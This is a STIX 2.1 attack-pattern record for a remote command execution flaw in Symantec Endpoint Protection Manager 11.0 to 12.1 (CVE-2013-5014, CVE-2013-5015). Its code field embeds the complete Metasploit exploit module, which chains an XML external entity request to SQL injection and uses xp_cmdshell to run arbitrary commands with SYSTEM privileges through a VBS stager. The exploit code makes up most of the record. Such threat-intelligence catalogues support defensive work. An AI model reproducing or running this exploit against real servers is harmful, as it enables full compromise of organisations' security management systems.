{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--456829e0-f08d-46a3-a29c-5bcaf93d72ce",
    "created": "2024-08-14T16:51:37.44709Z",
    "modified": "2024-08-14T16:51:37.447094Z",
    "name": "Symantec Endpoint Protection Manager /servlet/ConsoleServlet Remote Command Execution",
    "description": " This module exploits XXE and SQL injection flaws in Symantec Endpoint Protection Manager versions 11.0, 12.0 and 12.1. When supplying a specially crafted XML external entity (XXE) request an attacker can reach SQL injection affected components. As xp_cmdshell is enabled in the included database instance, it's possible to execute arbitrary system commands on the target with SYSTEM privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/antivirus/symantec_endpoint_manager_rce.rb",
            "external_id": "symantec_endpoint_manager_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5014"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5015"
        },
        {
            "source_name": "reference",
            "url": "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140218-0_Symantec_Endpoint_Protection_Multiple_critical_vulnerabilities_wo_poc_v10.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include REXML\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec Endpoint Protection Manager /servlet/ConsoleServlet Remote Command Execution',\n      'Description'    => %q{\n        This module exploits XXE and SQL injection flaws in Symantec Endpoint Protection Manager\n        versions 11.0, 12.0 and 12.1. When supplying a specially crafted XML external entity (XXE) request an attacker\n        can reach SQL injection affected components. As xp_cmdshell is enabled in the included\n        database instance, it's possible to execute arbitrary system commands on the target\n        with SYSTEM privileges.\n      },\n      'Author'         =>\n        [\n          'Stefan Viehbock', # Discovery\n          'Chris Graham', # PoC exploit\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2013-5014'],\n          ['CVE', '2013-5015'],\n          ['OSVDB', '103305'],\n          ['OSVDB', '103306'],\n          ['EDB', '31853'],\n          ['URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140218-0_Symantec_Endpoint_Protection_Multiple_critical_vulnerabilities_wo_poc_v10.txt']\n        ],\n      'Arch'           => ARCH_X86,\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows VBS Stager', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2014-02-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(9090),\n        OptString.new('TARGETURI', [true, 'The base path', '/'])\n      ])\n    deregister_options('CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    res = send_request_cgi(\n      {\n        'uri'   =>  normalize_uri(target_uri.path),\n        'method' => 'GET',\n      })\n\n    if res && res.code == 200 && res.body =~ /Symantec Endpoint Protection Manager/ && res.body =~ /1995 - 2013 Symantec Corporation/\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Sending payload\")\n    # Execute the cmdstager, max length of the commands is ~3950\n    execute_cmdstager({:flavor => :vbs, :linemax => 3950})\n  end\n\n  def execute_command(cmd, opts = {})\n    # Convert the command data to hex, so we can use that in the xp_cmdshell. Else characters like '>' will be harder to bypass in the XML.\n    command = \"0x#{Rex::Text.to_hex(\"cmd /c #{cmd}\", '')}\"\n\n    # Generate random 'xx032xxxx' sequence number.\n    seqnum = \"#{rand_text_numeric(2)}032#{rand_text_numeric(4)}\"\n\n    soap = soap_request(seqnum, command)\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(soap, \"text/xml\", nil, \"form-data; name=\\\"Content\\\"\")\n    xxe = post_data.to_s\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'servlet', 'ConsoleServlet'),\n        'method' => 'POST',\n        'vars_get' => { 'ActionType' => 'ConsoleLog' },\n        'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n        'data' => xxe,\n      })\n\n    if res and res.body !~ /ResponseCode/\n      fail_with(Failure::Unknown, \"#{peer} - Something went wrong.\")\n    end\n  end\n\n  def soap_request(seqnum, command)\n    randpayload = rand_text_alpha(8+rand(8))\n    randxxe = rand_text_alpha(8+rand(8))\n    entity = \"<!ENTITY #{randpayload} SYSTEM \\\"http://127.0.0.1:9090/servlet/ConsoleServlet?\"\n    entity << \"ActionType=ConfigServer&action=test_av&SequenceNum=#{seqnum}&Parameter=';call xp_cmdshell(#{command});--\\\" >\"\n\n    xml = Document.new\n    xml.add(DocType.new('sepm', \"[ METASPLOIT ]\"))\n    xml.add_element(\"Request\")\n    xxe = xml.root.add_element(randxxe)\n    xxe.text = \"PAYLOAD\"\n\n    xml_s = xml.to_s\n    xml_s.gsub!(/METASPLOIT/, entity) # To avoid html encoding\n    xml_s.gsub!(/PAYLOAD/, \"&#{randpayload};\") # To avoid html encoding\n\n    xml_s\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-02-24",
    "x_mitre_platforms": [
        "win'"
    ]
}